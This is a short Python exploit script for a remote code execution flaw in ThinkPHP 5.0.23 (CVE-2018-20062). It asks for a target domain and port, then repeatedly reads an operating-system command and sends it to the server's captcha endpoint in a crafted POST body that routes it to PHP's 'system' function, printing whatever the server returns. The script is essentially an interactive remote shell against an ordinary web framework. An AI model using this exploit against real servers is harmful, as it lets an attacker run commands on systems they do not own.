# -*- coding:utf-8 -*-

import re
import sys
import argparse
import requests

parser = argparse.ArgumentParser(
    epilog="\tExample: \r\npython " + sys.argv[0] + " -d domain.com -p 8080"
)
parser.add_argument("-d", dest="domain", help="The target's domain", required=True)
parser.add_argument("-p", dest="port", help="The thinkphp running port", required=True)
args = parser.parse_args()

domain = args.domain
port = args.port

print(f"""
----------------------------------
Title: ThinkPHP 5.0.23 RCE
CVE: CVE-2018-20062
Written By: github.com/ChinaRan0
Modified By: github.com/0xRar
----------------------------------
\nTarget Domain: {domain}
""")

url = f"http://{domain}:{port}/index.php?s=captcha"

while 1:
    domain_sys = input("<System command>: ")
    domain_post = {
        "_method": "__construct",
        "filter[]": "system",
        "method": "get",
        f"server[REQUEST_METHOD]": {domain_sys},
    }
    req = requests.post(url, data=domain_post)
    req.encoding = "utf-8"
    rebody = req.text
    obj = re.compile(r"(?P<SYSecho>.*?)<!DOCTYPE html>", re.S)
    chuli = obj.finditer(rebody)
    for it in chuli:
        print(it.group("SYSecho"))
